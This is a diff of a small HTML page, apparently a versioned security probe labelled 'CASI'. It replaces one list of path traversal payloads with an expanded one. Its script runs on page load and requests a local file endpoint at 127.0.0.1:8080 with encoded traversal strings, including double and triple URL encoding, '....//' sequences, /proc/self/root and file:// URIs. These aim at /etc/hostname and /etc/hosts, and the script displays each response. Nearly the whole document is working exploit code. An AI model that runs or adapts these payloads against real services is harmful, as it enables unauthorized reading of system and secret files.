@@ -1,4 +1,16 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI sibling fetch v24</title><style>body{font:14px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:8px}</style></head><body><h1>Sibling localhost file results</h1><div id="o"></div><script>
-const t=[['abs-hostname','/etc/hostname'],['d4-hostname','../../../../etc/hostname'],['d8-hostname','../../../../../../../../etc/hostname'],['d8-hosts','../../../../../../../../etc/hosts'],['proc-hostname','/proc/self/root/etc/hostname'],['dotdot-hostname','....//....//....//....//etc/hostname']];
-(async()=>{for(const [l,n] of t){let s='';const c=new AbortController(),q=setTimeout(()=>c.abort(),5000);try{const r=await fetch('http://127.0.0.1:8080/file?name='+encodeURIComponent(n),{cache:'no-store',signal:c.signal});const b=await r.text();s=l+' STATUS='+r.status+' TYPE='+r.headers.get('content-type')+' DISPOSITION='+r.headers.get('content-disposition')+' BODY='+JSON.stringify(b.slice(0,1200));}catch(e){s=l+' ERROR='+e.name+':'+e.message}clearTimeout(q);const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}})();
+<!doctype html><html><head><meta charset="utf-8"><title>CASI traversal normalization v25</title><style>body{font:13px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:6px}</style></head><body><h1>Sibling file normalization results</h1><div id="o"></div><script>
+const b='http://127.0.0.1:8080',t=[
+['raw-d8','/file?name=../../../../../../../../etc/hostname'],
+['double-d8','/file?name=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhostname'],
+['double-abs','/file?name=%252Fetc%252Fhostname'],
+['triple-d4','/file?name=..%25252F..%25252F..%25252F..%25252Fetc%25252Fhostname'],
+['dot4','/file?name=....%2F....%2F....%2F....%2Fetc%2Fhostname'],
+['proc1','/file?name=%2Fproc%2F1%2Froot%2Fetc%2Fhostname'],
+['procself','/file?name=%2Fproc%2Fself%2Froot%2Fetc%2Fhostname'],
+['file-uri','/file?name=file%3A%2F%2F%2Fetc%2Fhostname'],
+['path-d8','/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname'],
+['path-enc','/file/%252e%252e%252f%252e%252e%252fetc%252fhostname'],
+['filename','/file?filename=%2Fetc%2Fhostname'],
+['hosts-double','/file?name=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhosts']];
+(async()=>{await Promise.all(t.map(async([l,u])=>{let s='';const c=new AbortController(),q=setTimeout(()=>c.abort(),7000);try{const r=await fetch(b+u,{cache:'no-store',signal:c.signal});const x=await r.text();s=l+' STATUS='+r.status+' TYPE='+r.headers.get('content-type')+' BODY='+JSON.stringify(x.slice(0,800));}catch(e){s=l+' ERROR='+e.name+':'+e.message}clearTimeout(q);const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}))})();
 </script></body></html>
